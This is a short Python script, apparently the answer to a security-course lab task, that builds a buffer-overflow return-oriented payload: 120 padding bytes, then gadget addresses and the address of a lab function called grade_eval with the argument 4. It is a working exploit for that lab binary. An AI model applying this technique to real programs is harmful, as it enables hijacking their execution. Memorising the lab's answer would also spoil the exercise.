#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import struct
import sys

p64 = lambda v: struct.pack("<Q", v)

POP_RDI_RET = 0x4018A3
RET = 0x4018A5
grade_eval = 0x401677

payload = (
    b"A" * 120
    + p64(RET)
    + p64(POP_RDI_RET)
    + p64(4)
    + p64(grade_eval)
)

sys.stdout.buffer.write(payload)
